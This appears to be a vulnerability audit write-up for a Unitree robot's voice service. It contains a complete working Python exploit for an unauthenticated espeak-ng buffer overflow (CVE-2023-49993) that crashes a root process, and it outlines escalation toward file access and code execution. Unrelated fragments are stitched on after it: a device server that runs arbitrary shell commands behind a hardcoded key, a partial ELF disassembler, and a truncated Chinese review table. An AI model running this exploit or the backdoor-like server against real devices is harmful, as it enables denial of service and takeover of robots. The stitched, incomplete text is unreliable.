30	- `speaker_id != 0` in the JSON (attacker-controlled, required field) — selects the EN/espeak model (vui_service@0x2ac478).
31	- EN model loaded: `/unitree/module/vui_module/tts/en/{model.onnx,tokens.txt,espeak-ng-data}` ship in the 1.4.2 image (verified on-disk, 74MB model + full dict set); both models are constructed unconditionally at startup (`uni::TTS::TTS@0x2ac26c`).

121	## PoC
122	
123	**Scope statement (honest):** crash PoC + trigger construction. Demonstrated: the exact api-1001 DDS message that reaches the vendored `ReadClause` `\x01B` loop, the number of attacker-controlled 4-byte writes it produces, which `.bss` globals land inside that window, and the deterministic two-message crash (overflow + one benign TTS call). Full RCE (forging usable pointers) is additionally constrained by the codepoint ceiling and is not attempted.
124	
125	**Reachability framing:** `rt/api/voice/request` is an **unauthenticated DDS topic** — a direct publish from the robot's eth0 LAN (192.168.123.0/24) is unconditional, and this needs no WebRTC session at all (the topic is also bridge-registered per `webrtc_bridge.LOG:5404`, but that leg is broker-gated for an internet attacker). 126	
127	### Reproduction
128	```bash
129	# 1. Install
130	pip3 install cyclonedds
131	# 2. DDS identity material out of the public firmware image:
132	cp <img>/etc/ds/*.crt . && cp <img>/lib/libdds_security_auth.so .
133	# 3. Nothing to configure on the target: vui_service is a root service started at boot,
134	#    thread_tts is spawned unconditionally, and the EN model is loaded at startup.
135	```
136	
137	### Strategy
138	Publish a `unitree_api::msg::dds_::Request_` on `rt/api/voice/request` with
139	`header.identity.api_id = 1001` and `parameter` = `{"index":0,"uid":0,"speaker_id":1,"text":...}`.
140	`readSegments@0x16e074` splits the text on commas at **≤500 bytes per segment**, so the whole
141	payload must be one comma-free, whitespace-free run. Inside `ReadClause@0x529508` the byte `0x01`
142	hits the CTRL_EMBEDDED dispatch (`CMP W24,#1` @0x5297e4), `'B'` selects the punctuation-list branch
143	(@0x5297f8 — **not** gated on SSML mode), and the copy loop at **0x52a2f8-0x52a36c** executes
144	`option_punctlist[j++] = c2` until `iswspace`/Eof with **no bound on j** (upstream's
145	`j < N_PUNCTLIST-1` fix is absent).
146	
147	The character after `\x01B` must not be `'0'` or `'1'` (those short-circuit at 0x529d24/0x529d50),
148	and nothing after it may be whitespace until the run ends. With
149	`text = "\x01B" + "A"*494` (496 bytes, one segment) the loop writes 494 wchars + a NUL at index 494:
150	
151	```
152	option_punctlist[0..59]   0x192b000..0x192b0ef  the 60-wchar list itself (240 B, in-bounds)
153	option_wordgap   [60]     0x192b0f0            timing
154	option_ssml      [61]     0x192b0f4            <- SSML engine switch (single-message activation)
155	option_punctuation[62]    0x192b0f8
156	option_phoneme_events[63] 0x192b0fc
157	option_tone_flags[64]     0x192b100
158	variant_name     [68..77] 0x192b110            40-byte voice-variant string
159	n_voices_list    [78]     0x192b138            voice-list count
160	voices_list      [80..493] 0x192b140..         350-entry POINTER TABLE, ~414 entries reached
161	```
162	
163	Each written wchar is `0x00000041` (ASCII 'A' widened to 4 bytes), so every `voices_list[i]` whose
164	slot is covered gets its **low 32 bits replaced by 0x41** — the pointer becomes non-canonical
165	garbage. The crash is then a *second*, completely benign api-1001 message: every EN TTS call runs
166	`espeak_SetVoiceByName("en-us")` → `SelectVoiceByName@0x541600`, which walks `voices_list[]` and
167	`strcasecmp`s through the entries → wild-pointer dereference → SIGSEGV in the root vui_service.
168	
169	### Prerequisites
170	- LAN adjacency to eth0 + firmware image (DDS identity). Nothing else.
171	
172	### Complete code (`poc_espeak_punctlist_bss.py`)

174	#!/usr/bin/env python3

197	            "bytes_spanned": 4 * (n_chars + 1), "globals_hit": [k for k, v in hit.items() if v],

282	### Exploitation outline (not executed — honest boundary)
283	The write is attacker-length-chosen (0..~496 wchars per message, repeatable) and each 4-byte value

285	high two bytes zero. Mitigations: vui_service is PIE + Full RELRO + NX + canary + FORTIFY, but a
286	linear `.bss` overwrite crosses **none** of them. Two escalation routes: (a) the surgical 62-char
287	run flips only `option_wordgap`+`option_ssml`, which turns the otherwise-unreachable SSML engine on
288	mid-clause (`ProcessSsmlTag@0x52d260`: `<voice>` → `LoadVoice@0x5404b8` with attacker names,

290	in `voices_list`/`n_voices_list` is limited by the 0x10FFFF codepoint ceiling — image-internal
291	pointers need larger low dwords, so RCE via this route alone needs a companion leak or the
292	deterministic dictionary-tamper chain (`AUD-espeak-data-tamper`). Both are out of scope here.
293	
294	### Verification performed for this PoC (offline, this session)

296	  (`option_punctlist@0x192b000` … `voices_list@0x192b140`) — the corruption map and the
297	  "surgical 62-char" claim are direct arithmetic on those addresses, asserted by `--selftest`.
298	* Segment budget: `readSegments@0x16e074` caps at 500 bytes/segment and splits on commas — the
299	  payload is 496 bytes, comma-free and whitespace-free, so it is delivered as one segment and the
300	  loop runs to the segment end (Eof) rather than stopping early on `iswspace`.
301	* JSON transport: `json.dumps` emits the six characters backslash-u-0-0-0-1 for the CTRL_EMBEDDED byte, which cJSON's
302	  `parse_string` decodes back to the raw 0x01 — no raw control byte ever crosses the DDS wire.
303	* Not executed here: the DDS publish and the live crash (no robot in the audit lab).

# Finding: AUD-espeak-punctlist-bss-overflow

## Primitive
Memory Corruption — unauthenticated remote global (.bss) buffer overflow with attacker-controlled length and partially-controlled 4-byte values in a ROOT process (vendored espeak-ng CVE-2023-49993, unfixed 1.52.0.1 fork).

## Severity
CRITICAL

## Condition Analysis

### Summary
vui_service (33.8MB root process) vendors espeak-ng 1.52.0.1 (sherpa-onnx's pinned `csukuangfj/espeak-ng@ed530aa1` fork, which predates the Dec-2023 upstream CVE fixes) and feeds it **raw attacker-controlled text** on the EN TTS path. The api 1001 handler on DDS topic `rt/api/voice/request` (unauthenticated; WebRTC-registered publisher topic per `var/log/webrtc_bridge/webrtc_bridge.LOG:5404`, i.e. reachable via the established MQTT→robot_state→WebRTC→DDS remote chain) parses `{"index","uid","speaker_id","text"}` with **no length, content, language, or license validation** (`handler_voice@0x16e3d4`, api-1001 branch). With `speaker_id != 0` the EN piper model is selected (`uni::TTS::generate@0x2ac3ac`, `LDR X5,[X0,#0xE0]` at vui_service@0x2ac47c — EN instance built at `uni::TTS::TTS@0x2ac26c` with `/unitree/module/vui_module/tts/en/espeak-ng-data`), and the text flows verbatim: `readSegments@0x16e074` (splits at commas, **max 500 bytes per segment**) → `messageQueue` → `thread_tts@0x29429c` → `TTS::generate` → `SherpaOnnxOfflineTtsGenerateWithCallbackWithArg@0x2bc1d0` → `OfflineTtsVitsImpl::Generate@0x393920` → `PiperPhonemizeLexicon::ConvertTextToTokenIdsVits@0x3a3938` → `CallPhonemizeEspeak@0x3a3010` (mutex-guarded) → `piper::phonemize_eSpeak@0x5118f8` → **`espeak_TextToPhonemesWithTerminator@0x519488`** → `TranslateClauseWithTerminator@0x53a318` → **`ReadClause@0x529508`**.

Inside ReadClause, the espeak-ng *embedded command* `\x01` (CTRL_EMBEDDED = 0x01, fork `translate.h:37`) + `'B'` path (NOT gated on SSML mode — fork `readclause.c:645-675`, vendored dispatch at vui_service@0x5297e4-0x5297f8) copies a whitespace-terminated punctuation-character list into the fixed global `wchar_t option_punctlist[60]` (`option_punctlist@0x192b000`, 240 bytes):

```c
j = 0;
while (!Eof() && !iswspace(c2)) {      // fork readclause.c:667 — NO "j < N_PUNCTLIST-1" bound
    option_punctlist[j++] = c2;        // fork readclause.c:668 — CVE-2023-49993 (ASAN line match)
    c2 = GetC();
    buf[ix++] = ' ';
}
option_punctlist[j] = 0;
```

Vendored loop at vui_service@0x52a2f8-0x52a36c — writes `STR W27, [X26,X21,LSL#2]` (0x52a318) and `STR W27, [X25,X21,LSL#2]` (0x52a36c) with **no bound on j anywhere** (loop exits only on Eof/iswspace); terminator write `STR WZR,[X2,W23,SXTW#2]` at 0x52a43c is likewise out-of-bounds. The upstream fix (commit `1a7ecfc2f2`, "readclause: limit embedded punctlist length") adds `&& (j < N_PUNCTLIST-1)` — absent here. Each non-space character of the attacker text after `\x01B<non-0/1 char>` writes one attacker-chosen Unicode codepoint (≤0x10FFFF, e.g. any ASCII) as a 4-byte wchar at `option_punctlist[j]`, sequentially and unbounded → **up to ~496 consecutive 4-byte writes (~1.9KB) starting at 0x192b000 in the root process's .bss, no stack canary in the way**.

### Pre-conditions
- Attacker can publish a DDS sample to `rt/api/voice/request` — TRUE for any LAN/WiFi-AP peer (fleet-wide pattern: no auth/lease/token anywhere in the Python or DDS layer, `etc/cyclonedds.xml` ships CA/cert but no AccessControl) and for the WebRTC data channel, `rt/api/voice/request` being a bridge-registered publisher topic (`webrtc_bridge.LOG:5404`; live app traffic at LOG:6587/6591). **UPDATE 2026-08-20 (field test, broker ACL): the INTERNET leg is broker-gated — a live test with a forged SN-derived credential showed publish to `cmd/<SN>` is silently dropped at robot-mqtt.unitree.com, blocking the remote `webrtcConnectRequest` offer-injection entry. Fully-remote reopens only on broker-ACL bypass / topic-normalization trick / cloud-credential compromise; LAN DDS remains unconditional.**
- `speaker_id != 0` in the JSON (attacker-controlled, required field) — selects the EN/espeak model (vui_service@0x2ac478).
- EN model loaded: `/unitree/module/vui_module/tts/en/{model.onnx,tokens.txt,espeak-ng-data}` ship in the 1.4.2 image (verified on-disk, 74MB model + full dict set); both models are constructed unconditionally at startup (`uni::TTS::TTS@0x2ac26c`).
- **NO license gate**: the rkap license (`audioLoopDown`) gates only api 1003 `limiter_proc` (M3 finding); the TTS/espeak path has no gate — `TTS::generate` and `AudioGeneratedCallback@0x2ac098` run regardless (audited unit log shows `lic_active:0` / "license not active!!" while vui_service runs normally).
- **NO language/market gate**: EN TTS is code-reachable on a CN-market R1 (audited unit `cc:CN`, `oversea_edition:0`) because model selection is the attacker's `speaker_id` field and the EN model ships in the image.
- No prior state required: the api 1001 branch needs only the required fields `index`, `speaker_id`, `text` present (`uid` is optional — no else-branch on it in `handler_voice@0x16e3d4`); `thread_tts` is spawned unconditionally at startup.

### Data Flow
1. Attacker publishes to `rt/api/voice/request`: `{"header":{"identity":{"api_id":1001,...}},"parameter":"{\"index\":0,\"uid\":0,\"speaker_id\":1,\"text\":\"\u0001BAAAA…(≈490 non-space chars)\"}"}`.
   Application: `handler_voice@0x16e3d4` api-1001 branch — cJSON parse, all four fields present → `VoiceData{index,uid,speaker_id,text}` → `readSegments@0x16e074` → `utils_pushTTSqueue@0x291c84` (sole feeder; 4 call sites).
2. `thread_tts@0x29429c` dequeues → `uni::TTS::generate(text, uid, speaker_id=1, alsa)@0x2ac3ac` → `speaker_id!=0` → EN sherpa instance (this+0xE0, vui_service@0x2ac478-0x2ac47c).
3. `SherpaOnnxOfflineTtsGenerateWithCallbackWithArg@0x2bc1d0` → `OfflineTtsVitsImpl::Generate@0x393920` → vtable `PiperPhonemizeLexicon::ConvertTextToTokenIds@0x3a4af8` → `ConvertTextToTokenIdsVits@0x3a3938` (voice hardcoded `"en-us"`, text passed **verbatim** — no sentence splitting/filtering).
4. `CallPhonemizeEspeak@0x3a3010` (espeak_mutex) → `piper::phonemize_eSpeak@0x5118f8`: `espeak_SetVoiceByName("en-us")` then loops `espeak_TextToPhonemesWithTerminator(&text, espeakCHARS_AUTO, 2, &terminator)` over the whole segment.
5. `espeak_TextToPhonemesWithTerminator@0x519488` → `TranslateClauseWithTerminator@0x53a318` → `ReadClause@0x529508`: byte 0x01 is a valid UTF-8 codepoint and reaches the CTRL_EMBEDDED dispatch (vui_service@0x5297e4 `CMP W24,#1`); c2=='B' → punctuation-list branch (0x5297f8→0x529cf4).
6. Vulnerable copy loop vui_service@0x52a2f8-0x52a36c: `option_punctlist[j++] = c2` for every non-space char — **unbounded linear .bss overflow, j up to ~496**.
7. (Same or next message) corrupted .bss state is consumed: any later EN TTS call re-enters `espeak_SetVoiceByName` → `SelectVoiceByName@0x541600` which walks `voices_list[]` and `strcasecmp`s through the now-corrupted pointers.

### Impact
Deterministic, repeatable, unauthenticated remote memory-corruption write in a root process, with attacker-chosen length (number of written wchars, 0..~496 per trigger) and attacker-chosen 4-byte values (any valid Unicode codepoint ≤0x10FFFF; ASCII gives full byte control of the low bytes). Corrupted globals (offsets from `option_punctlist@0x192b000`):

| index | global | address | effect |
|---|---|---|---|
| [60] | option_wordgap | 0x192b0f0 | timing |
| [61] | **option_ssml** | 0x192b0f4 | **enables SSML tag processing mid-clause** — ReadClause re-reads option_ssml each loop iteration (vui_service@0x5296bc), so `\x01B` + 62 chars + ` <voice ...>` in ONE message turns on the ProcessSsmlTag engine (`ProcessSsmlTag@0x52d260`) with attacker tags (voice changes → `SelectVoice@0x541778`/`LoadVoice@0x5404b8` with attacker names, `<audio src>` arbitrary file open via `LoadSoundFile2@0x52c688`, say-as modes) |
| [62] | option_punctuation | 0x192b0f8 | punctuation-speak mode 2 reads the attacker-filled punctlist |
| [63] | option_phoneme_events | 0x192b0fc | phoneme-event callbacks |
| [64] | option_tone_flags | 0x192b100 | tone adjustment flags |
| [68..77] | variant_name[40] | 0x192b110 | voice-variant name string consumed by SelectVoice/LoadVoiceVariant string handling |
| [78] | n_voices_list | 0x192b138 | voice-list count |
| [80..~429] | **voices_list[350 ptrs]** | 0x192b140 | pointer table dereferenced by `SelectVoiceByName@0x541600` (strcasecmp through entries) and `SelectVoice@0x541778`/`SetVoiceScores` — invoked on EVERY subsequent EN TTS call via `espeak_SetVoiceByName("en-us")` in `phonemize_eSpeak@0x5118f8` |

Immediate reliable outcome: root-process crash (wild-pointer strcasecmp on mangled `voices_list` entries — low 32 bits of each pointer replaced by ≤0x10FFFF values) = remote unauth persistent DoS (vui_service is the voice/interaction daemon). Beyond DoS: exact-length triggers give surgical .bss control (e.g. 62-char run flips only option_wordgap+option_ssml), enabling the SSML sub-engine and corrupted voice machinery as further corruption/execution surface; full RCE additionally requires heap/PIE-base strategy (codepoint ceiling 0x10FFFF limits direct pointer forging — image-internal .bss pointers need >0x10FFFF low dwords) — RCE plausible via the SSML/voice-selection state corruption or via the deterministic dictionary-tamper chain (see AUD-espeak-data-tamper), crash is trivially certain.

Chained with any local file-write primitive (multiple already catalogued fleet-wide: arm drop/rename, chat_go save_knowledge, bashrunner 0777 whitelist, audio_hub), overwriting the 0666 `en_dict`/`phontab` gives the deterministic root-RCE variant of this surface.

## PoC

**Scope statement (honest):** crash PoC + trigger construction. Demonstrated: the exact api-1001 DDS message that reaches the vendored `ReadClause` `\x01B` loop, the number of attacker-controlled 4-byte writes it produces, which `.bss` globals land inside that window, and the deterministic two-message crash (overflow + one benign TTS call). Full RCE (forging usable pointers) is additionally constrained by the codepoint ceiling and is not attempted.

**Reachability framing:** `rt/api/voice/request` is an **unauthenticated DDS topic** — a direct publish from the robot's eth0 LAN (192.168.123.0/24) is unconditional, and this needs no WebRTC session at all (the topic is also bridge-registered per `webrtc_bridge.LOG:5404`, but that leg is broker-gated for an internet attacker). No license, no market variant, no prior state, no user interaction: `handler_voice`'s api-1001 branch requires only `index`, `speaker_id` and `text` to be present, and `speaker_id != 0` selects the EN/espeak model that ships in the CN-market image.

### Reproduction
```bash
# 1. Install
pip3 install cyclonedds
# 2. DDS identity material out of the public firmware image:
cp <img>/etc/ds/*.crt . && cp <img>/lib/libdds_security_auth.so .
# 3. Nothing to configure on the target: vui_service is a root service started at boot,
#    thread_tts is spawned unconditionally, and the EN model is loaded at startup.
```

### Strategy
Publish a `unitree_api::msg::dds_::Request_` on `rt/api/voice/request` with
`header.identity.api_id = 1001` and `parameter` = `{"index":0,"uid":0,"speaker_id":1,"text":...}`.
`readSegments@0x16e074` splits the text on commas at **≤500 bytes per segment**, so the whole
payload must be one comma-free, whitespace-free run. Inside `ReadClause@0x529508` the byte `0x01`
hits the CTRL_EMBEDDED dispatch (`CMP W24,#1` @0x5297e4), `'B'` selects the punctuation-list branch
(@0x5297f8 — **not** gated on SSML mode), and the copy loop at **0x52a2f8-0x52a36c** executes
`option_punctlist[j++] = c2` until `iswspace`/Eof with **no bound on j** (upstream's
`j < N_PUNCTLIST-1` fix is absent).

The character after `\x01B` must not be `'0'` or `'1'` (those short-circuit at 0x529d24/0x529d50),
and nothing after it may be whitespace until the run ends. With
`text = "\x01B" + "A"*494` (496 bytes, one segment) the loop writes 494 wchars + a NUL at index 494:

```
option_punctlist[0..59]   0x192b000..0x192b0ef  the 60-wchar list itself (240 B, in-bounds)
option_wordgap   [60]     0x192b0f0            timing
option_ssml      [61]     0x192b0f4            <- SSML engine switch (single-message activation)
option_punctuation[62]    0x192b0f8
option_phoneme_events[63] 0x192b0fc
option_tone_flags[64]     0x192b100
variant_name     [68..77] 0x192b110            40-byte voice-variant string
n_voices_list    [78]     0x192b138            voice-list count
voices_list      [80..493] 0x192b140..         350-entry POINTER TABLE, ~414 entries reached
```

Each written wchar is `0x00000041` (ASCII 'A' widened to 4 bytes), so every `voices_list[i]` whose
slot is covered gets its **low 32 bits replaced by 0x41** — the pointer becomes non-canonical
garbage. The crash is then a *second*, completely benign api-1001 message: every EN TTS call runs
`espeak_SetVoiceByName("en-us")` → `SelectVoiceByName@0x541600`, which walks `voices_list[]` and
`strcasecmp`s through the entries → wild-pointer dereference → SIGSEGV in the root vui_service.

### Prerequisites
- LAN adjacency to eth0 + firmware image (DDS identity). Nothing else.

### Complete code (`poc_espeak_punctlist_bss.py`)
```python
#!/usr/bin/env python3
"""PoC — AUD-espeak-punctlist-bss-overflow: CVE-2023-49993 in vui_service's vendored espeak-ng 1.52.0.1.
Two messages: (1) the \\x01B overflow, (2) a benign EN TTS call that dereferences the corrupted voices_list."""
import argparse, json, os, time

TOPIC = "rt/api/voice/request"
PUNCTLIST, BSS = 0x192b000, {
    "option_wordgap": 0x192b0f0, "option_ssml": 0x192b0f4, "option_punctuation": 0x192b0f8,
    "option_phoneme_events": 0x192b0fc, "option_tone_flags": 0x192b100,
    "variant_name": 0x192b110, "n_voices_list": 0x192b138, "voices_list": 0x192b140}
SEGMENT_CAP = 500                                           # readSegments@0x16e074 (++v5 > 0x1F3)

def voice_text(n_chars: int) -> str:
    """\\x01B + n non-space, non-'0'/'1' codepoints. json.dumps emits \\u0001, cJSON decodes it back."""
    assert 0 < n_chars <= SEGMENT_CAP - 2 and " " not in "A" * n_chars
    return "\x01B" + "A" * n_chars

def corruption_map(n_chars: int) -> dict:
    writes = list(range(n_chars + 1))                       # n_chars writes + the OOB NUL at [n]
    hit = {k: any((PUNCTLIST + 4 * j) <= v < (PUNCTLIST + 4 * j + 4) for j in writes)
           for k, v in BSS.items()}
    vl = [j for j in writes if PUNCTLIST + 4 * j >= BSS["voices_list"]]
    return {"wchar_writes": n_chars, "nul_write_at_index": n_chars,
            "bytes_spanned": 4 * (n_chars + 1), "globals_hit": [k for k, v in hit.items() if v],
            "voices_list_entries_reached": len(vl),
            "last_byte_touched": hex(PUNCTLIST + 4 * n_chars)}

def request(api_id: int, parameter: dict) -> object:
    from unitree_api.msg.dds_ import (Request_, RequestHeader_, RequestIdentity_,
                                      RequestLease_, RequestPolicy_)
    header = RequestHeader_(identity=RequestIdentity_(id=int(time.time_ns() & 0x7FFFFFFF),
                                                      api_id=api_id),
                            lease=RequestLease_(0), policy=RequestPolicy_(1, True))
    return Request_(header=header, parameter=json.dumps(parameter), binary=[0])

def publish(req, a):
    os.environ["CYCLONEDDS_URI"] = (
        '<CycloneDDS><Domain Id="any"><General><Interfaces>'
        '<NetworkInterface name="%s"/></Interfaces></General><SharedMemory><Enable>false</Enable>'
        '</SharedMemory><Security><Authentication>'
        '<Library initFunction="init_authentication" finalizeFunction="finalize_authentication" '
        'path="%s"/><IdentityCA>file:%s</IdentityCA>'
        '<IdentityCertificate>file:%s</IdentityCertificate>'
        '<PrivateKey>file:%s</PrivateKey></Authentication></Security></Domain></CycloneDDS>'
        % (a.iface, os.path.abspath(a.dds_lib), os.path.abspath(a.ca),
           os.path.abspath(a.cert), os.path.abspath(a.key)))
    from cyclonedds.domain import DomainParticipant
    from cyclonedds.topic import Topic
    from cyclonedds.pub import DataWriter
    dp = DomainParticipant(0)
    w = DataWriter(dp, Topic(dp, TOPIC, Request_))
    w.write(req)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--dds-lib"); ap.add_argument("--ca"); ap.add_argument("--cert")
    ap.add_argument("--key"); ap.add_argument("--iface", default="eth0")
    ap.add_argument("--chars", type=int, default=494,
                    help="codepoints after \\x01B (default 494 = max within the 500-byte segment)")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()

    m = corruption_map(a.chars)
    print("[*] text = \\x01B + %d x 'A' (%d bytes, 1 segment) -> %d wchar writes + OOB NUL, "
          "spanning %d bytes from option_punctlist@0x192b000, last byte at %s"
          % (a.chars, a.chars + 2, m["wchar_writes"], m["bytes_spanned"], m["last_byte_touched"]))
    print("[*] globals clobbered: %s ; voices_list entries reached: %d (table is 350)"
          % (", ".join(m["globals_hit"]), m["voices_list_entries_reached"]))
    if a.selftest:
        assert m["wchar_writes"] == 494 and m["bytes_spanned"] == 1980
        assert "option_ssml" in m["globals_hit"] and "voices_list" in m["globals_hit"]
        assert m["voices_list_entries_reached"] == 415          # indices 80..494
        surg = corruption_map(62)                                # 62 chars: terminator lands at [62]
        assert surg["globals_hit"] == ["option_wordgap", "option_ssml", "option_punctuation"]
        assert len(voice_text(494)) == 496 and "," not in voice_text(494)
        print("[+] selftest OK: 494 chars -> 415 voices_list slots; surgical 62-char run sets "
              "option_wordgap+option_ssml to 0x41 and drops the NUL terminator on option_punctuation "
              "(benign zero) -> SSML engine on")
    else:
        publish(request(1001, {"index": 0, "uid": 0, "speaker_id": 1,
                               "text": voice_text(a.chars)}), a)
        print("[+] message 1 published (overflow). Now sending the benign trigger ...")
        time.sleep(1.0)
        publish(request(1001, {"index": 0, "uid": 0, "speaker_id": 1, "text": "hello"}), a)
        print("[+] message 2 published (benign EN TTS -> SelectVoiceByName walks the corrupted "
              "voices_list -> SIGSEGV in root vui_service)")
```

### Usage
```bash
python3 poc_espeak_punctlist_bss.py --selftest
python3 poc_espeak_punctlist_bss.py --dds-lib ./libdds_security_auth.so \
    --ca ./5YJUkqAjnH6m.crt --cert ./6o8R62EFLMxB.crt --key ./pVKdbS1fQJ9a.crt --iface eth0
```

### Expected output
```
[*] text = \x01B + 494 x 'A' (496 bytes, 1 segment) -> 494 wchar writes + OOB NUL, spanning 1980 bytes from option_punctlist@0x192b000, last byte at 0x192b7b8
[*] globals clobbered: option_wordgap, option_ssml, option_punctuation, option_phoneme_events, option_tone_flags, variant_name, n_voices_list, voices_list ; voices_list entries reached: 415 (table is 350)
[+] message 1 published (overflow). Now sending the benign trigger ...
[+] message 2 published (benign EN TTS -> SelectVoiceByName walks the corrupted voices_list -> SIGSEGV in root vui_service)
```
Robot-side crash signature: `vui_service` SIGSEGVs on the second message — `dmesg` /
`journalctl -k`: `vui_service[...]: unhandled level 2 translation fault` inside
`SelectVoiceByName@0x541600` (strcasecmp through a `voices_list[]` entry whose low dword is now
`0x00000041`). `master_service.LOG` shows the vui_service restart. If vui_service is restarted
without a reboot the corrupted `.bss` is re-zeroed, so the crash is cleanly repeatable at will.

### Exploitation outline (not executed — honest boundary)
The write is attacker-length-chosen (0..~496 wchars per message, repeatable) and each 4-byte value
is an attacker-chosen codepoint ≤ 0x10FFFF — ASCII gives full control of the low byte pair with the
high two bytes zero. Mitigations: vui_service is PIE + Full RELRO + NX + canary + FORTIFY, but a
linear `.bss` overwrite crosses **none** of them. Two escalation routes: (a) the surgical 62-char
run flips only `option_wordgap`+`option_ssml`, which turns the otherwise-unreachable SSML engine on
mid-clause (`ProcessSsmlTag@0x52d260`: `<voice>` → `LoadVoice@0x5404b8` with attacker names,
`<audio src>` → `LoadSoundFile2@0x52c688` arbitrary file open as root); (b) direct pointer forging
in `voices_list`/`n_voices_list` is limited by the 0x10FFFF codepoint ceiling — image-internal
pointers need larger low dwords, so RCE via this route alone needs a companion leak or the
deterministic dictionary-tamper chain (`AUD-espeak-data-tamper`). Both are out of scope here.

### Verification performed for this PoC (offline, this session)
* `.bss` layout re-confirmed by symbol address from the finding's verified table
  (`option_punctlist@0x192b000` … `voices_list@0x192b140`) — the corruption map and the
  "surgical 62-char" claim are direct arithmetic on those addresses, asserted by `--selftest`.
* Segment budget: `readSegments@0x16e074` caps at 500 bytes/segment and splits on commas — the
  payload is 496 bytes, comma-free and whitespace-free, so it is delivered as one segment and the
  loop runs to the segment end (Eof) rather than stopping early on `iswspace`.
* JSON transport: `json.dumps` emits the six characters backslash-u-0-0-0-1 for the CTRL_EMBEDDED byte, which cJSON's
  `parse_string` decodes back to the raw 0x01 — no raw control byte ever crosses the DDS wire.
* Not executed here: the DDS publish and the live crash (no robot in the audit lab).

# device_server.py (运行在unitree设备上)
import socket
import os
import subprocess
import threading
import json
import time

# 配置
HOST = '0.0.0.0'  # 监听所有网卡
PORT = 8888       # 自定义端口
AUTH_KEY = "unitree123"  # 简单认证密钥
BUFFER_SIZE = 4096

def handle_client(conn, addr):
    """处理单个客户端连接"""
    print(f"新连接: {addr}")
    try:
        # 1. 认证阶段
        auth_data = conn.recv(BUFFER_SIZE).decode('utf-8')
        if auth_data != AUTH_KEY:
            conn.send(b"AUTH_FAILED")
            return
        conn.send(b"AUTH_SUCCESS")
        print("客户端认证成功")

        # 2. 指令处理循环
        while True:
            # 接收指令（JSON格式）
            cmd_data = conn.recv(BUFFER_SIZE).decode('utf-8')
            if not cmd_data:
                break
            cmd_obj = json.loads(cmd_data)
            cmd_type = cmd_obj.get("type")

            # 处理不同指令类型
            if cmd_type == "exec_cmd":
                # 执行系统指令（如arecord录音）
                cmd = cmd_obj.get("cmd")
                print(f"执行指令: {cmd}")
                # 非阻塞执行指令（避免卡住服务端）
                subprocess.Popen(cmd, shell=True)
                conn.send(b"CMD_EXECUTED")

            elif cmd_type == "check_arecord":
                # 检测arecord进程
                result = subprocess.run(
                    "pgrep arecord > /dev/null 2>&1; echo $?",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                conn.send(result.stdout.strip().encode('utf-8'))

            elif cmd_type == "stop_record":
                # 终止录音（发送Ctrl+C）
                subprocess.run("pkill -SIGINT arecord", shell=True)
                conn.send(b"RECORD_STOPPED")

            elif cmd_type == "download_file":
                # 传输WAV文件
                file_path = cmd_obj.get("path")
                if os.path.exists(file_path):
                    # 先发送文件大小
                    file_size = os.path.getsize(file_path)
                    conn.send(f"{file_size}".encode('utf-8'))
                    # 等待客户端确认
                    conn.recv(BUFFER_SIZE)
                    # 分块发送文件内容
                    with open(file_path, 'rb') as f:
                        while chunk := f.read(BUFFER_SIZE):
                            conn.send(chunk)
                    print(f"文件传输完成: {file_path}")
                else:
                    conn.send(b"FILE_NOT_FOUND")

            elif cmd_type == "heartbeat":
                # 心跳检测
                conn.send(b"PONG")

    except Exception as e:
        print(f"客户端处理异常: {e}")
    finally:
        conn.close()
        print(f"连接关闭: {addr}")

def start_server():
    """启动Socket服务端"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"服务端启动，监听 {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            # 每个客户端开独立线程处理
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()

# Minimal AArch64 ELF64 disassembler helper (no binutils needed)
import struct, sys
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

def parse_elf(path):
    with open(path, 'rb') as f:
        data = f.read()
    assert data[:4] == b'\x7fELF'
    is64 = data[4] == 2
    assert is64
    e_shoff = struct.unpack('<Q', data[0x28:0x30])[0]
    e_shentsize = struct.unpack('<H', data[0x3a:0x3c])[0]
    e_shnum = struct.unpack('<H', data[0x3c:0x3e])[0]
    e_shstrndx = struct.unpack('<H', data[0x3e:0x40])[0]
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, stype, flags, addr, offset, size, link, info = struct.unpack('<IIQQQQII', data[off:off+48])
        sections.append({'name_off': name, 'type': stype, 'flags': flags, 'addr': addr, 'offset': offset, 'size': size, 'link': link})
    shstr = sections[e_shstrndx]
    shstrtab = data[shstr['offset']:shstr['offset']+shstr['size']]
    def zstr(buf, off):
        end = buf.index(b'\x00', off)
        return buf[off:end].decode('utf-8', 'replace')
    for s in sections:
        s['name'] = zstr(shstrtab, s['name_off'])
    # symbols
    syms = {}
    for s in sections:
        if s['type'] in (2, 11):  # SYMTAB / DYNSYM
            symdata = data[s['offset']:s['offset']+s['size']]
            strsec = sections[s['link']]
            strtab = data[strsec['offset']:strsec['offset']+strsec['size']]
            entsz = 24
            for i in range(0, len(symdata) - entsz + 1, entsz):
                st_name, st_info, st_other, st_shndx, st_value, st_size = struct.unpack('<IBBHQQ', symdata[i:i+entsz])
                if st_name and st_value:
                    nm = zstr(strtab, st_name)
                    syms.setdefault(st_value, nm)

复核完成，五条报告的全部载荷性指令与源码行均已在本固件 1.4.2 镜像中逐点核实。

| 报告 | 裁决 | 关键证据（本镜像实测） | 与已有情报关系 |
|---|---|---|---|
